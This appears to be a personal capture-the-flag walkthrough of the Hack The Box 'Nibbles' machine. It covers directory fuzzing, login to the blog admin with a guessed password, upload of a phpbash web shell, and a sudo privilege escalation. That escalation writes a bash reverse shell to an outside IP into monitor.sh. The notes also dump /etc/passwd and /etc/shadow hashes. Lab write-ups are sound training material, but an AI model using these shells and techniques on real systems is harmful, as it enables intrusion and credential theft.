http://10.10.10.75/nibbleblog/


![[nibbleblog.png]]

```txt
http://10.10.10.75/nibbleblog/index.php?controller=blog&action=view&category=music
```

*feed.php* in the page footer.

```html
<!-- FOOTER --> <footer id="blog-foot"> <span class="blog-atom"><a href="[/nibbleblog/feed.php](view-source:http://10.10.10.75/nibbleblog/feed.php)">Atom</a></span> <span class="blog-footer"> · <a class="top" href="[#](view-source:http://10.10.10.75/nibbleblog/index.php?controller=blog&action=view&category=uncategorised#)">Top</a></span> <span class="blog-footer"> · Powered by Nibbleblog</span> <script> $(".top").click(function(){
			$("html, body").animate({ scrollTop: 0 }, 600);
			return false;
		}); </script> </footer>
```


![[admin_dir.png]]

```bash
ffuf -w /usr/share/wordlists/ffuf/common.txt -u ${ipurl}/index.php?controller=FUZZ&action=view&category=uncategorised

ffuf -w /usr/share/wordlists/ffuf/common.txt -u ${ipurl}/index.php?controller=blog&action=FUZZ&category=uncategorised
 
ffuf -w /usr/share/wordlists/ffuf/common.txt -u ${ipurl}/index.php?controller=blog&action=view&category=FUZZ
  
ffuf -w /usr/share/wordlists/ffuf/common.txt -u ${ipurl}/index.php?controller=FUZZ&action=FUZZ&category=FUZZ


```

```
dirb http://10.10.10.75:80/nibbleblog/ -o /HTB-boxes/nibbles/enum/web/dirb_ip2.md
dirb http://10.10.10.75:80/nibbleblog/ -X .txt,.sh,.php,.pl,.py,.xml,.bak -o /HTB-boxes/nibbles/enum/web/dirb_ip_ext2.md

dirb http://nibble.htb:80/nibbleblog/ -o /HTB-boxes/nibbles/enum/web/dirb_host2.md
dirb http://nibble.htb:80/nibbleblog/ -X .txt,.sh,.php,.pl,.py,.xml,.bak -o /HTB-boxes/nibbles/enum/web/dirb_host_ext2.md
```

using the *simpler* theme
```html
<link rel="canonical" href="http://10.10.10.134/nibbleblog/">
<link rel="alternate" type="application/atom+xml" title="ATOM Feed" href="/nibbleblog/feed.php">
<link rel="stylesheet" type="text/css" href="/nibbleblog/themes/simpler/css/normalize.css">
<link rel="stylesheet" type="text/css" href="/nibbleblog/themes/simpler/css/main.css">
<link rel="stylesheet" type="text/css" href="/nibbleblog/themes/simpler/css/post.css">
<link rel="stylesheet" type="text/css" href="/nibbleblog/themes/simpler/css/page.css">
<link rel="stylesheet" type="text/css" href="/nibbleblog/themes/simpler/css/plugins.css">
<link rel="stylesheet" type="text/css" href="/nibbleblog/themes/simpler/css/rainbow.css">
```

### Admin Panel & Login

```bash
dirb http://10.10.10.75:80/nibbleblog/ -o /HTB-boxes/nibbles/enum/web/dirb_ip2.md
```

```txt
+ http://10.10.10.75:80/nibbleblog/admin.php (CODE:200|SIZE:1401)
```

![[admin_login_panel.png]]

Guessing basic passwords, we find that we are able to login with the following credentials:

```txt
admin::nibbles
```

Error:

```txt
Nibbleblog security error - Blacklist protection
```

Reset the box

![[admin_panel.png]]

### Initial Access

We are able to upload files throug the *My Image Plugin*

![[upload_phpbash.png]]

Reference: *https://github.com/Arrexel/phpbash/blob/master/phpbash.php*

We recive the following error because our file is not an image:

![[err1.png]]

However, we can still acces phpbash by visiting the following url:

```txt
http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php
```

![[phpbashinfo.png]]


![[local.txt.png]]

```txt
b55d82a44d5b70d69110e0f26d10623c
```

### Privesc

![[check-priv.png]]

```bash
cd /home/nibbler/
unzip personal.zip
cd personal/stuff/
```

Now lets change the script to only include our reverse shell payload.

```bash
echo "#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.12/4321 0>&1" > /home/nibbler/personal/stuff/monitor.sh
```

Execute our reverse shell with the following command:

```bash
chmod +x monitor.sh
sudo ./monitor.sh
```

![[got_root_shell.png]]

![[root.txt.png]]

```txt
cd6ce707e98594ae6f9afe0f4e65d773
```

### House Cleaning

```bash
rm -rf /home/nibbler/personal/
rm -rf /var/www/html/nibbleblog/content/private/plugins/my_image/image.php
```


### /etc/passwd

```txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/false
nibbler:x:1001:1001::/home/nibbler:
```

```txt
root:$6$DewMP6p.$vV1WdlCbgZJkOM98Qw7Dur.A.4YOq910laHkQZu/uMuomOjKntzg5GSsl8pYT0qtW9I.YMkr3HBC0Sw/s3TKq0:17511:0:99999:7:::
daemon:*:17001:0:99999:7:::
bin:*:17001:0:99999:7:::
sys:*:17001:0:99999:7:::
sync:*:17001:0:99999:7:::
games:*:17001:0:99999:7:::
man:*:17001:0:99999:7:::
lp:*:17001:0:99999:7:::
mail:*:17001:0:99999:7:::
news:*:17001:0:99999:7:::
uucp:*:17001:0:99999:7:::
proxy:*:17001:0:99999:7:::
www-data:*:17001:0:99999:7:::
backup:*:17001:0:99999:7:::
list:*:17001:0:99999:7:::
irc:*:17001:0:99999:7:::
gnats:*:17001:0:99999:7:::
nobody:*:17001:0:99999:7:::
systemd-timesync:*:17001:0:99999:7:::
systemd-network:*:17001:0:99999:7:::
systemd-resolve:*:17001:0:99999:7:::
systemd-bus-proxy:*:17001:0:99999:7:::
syslog:*:17001:0:99999:7:::
_apt:*:17001:0:99999:7:::
lxd:*:17431:0:99999:7:::
messagebus:*:17431:0:99999:7:::
uuidd:*:17431:0:99999:7:::
dnsmasq:*:17431:0:99999:7:::
sshd:*:17431:0:99999:7:::
mysql:!:17510:0:99999:7:::
nibbler:$6$X3A8Ojo1$ZixRGB1HEQv552mnnJALZ6hOStYqqJuMoUsFipTFJl22OBupNaqGluyidsq4bZ2oBxr2YH/p4.v/ZaMosY4jZ/:17511:0:99999:7:::
```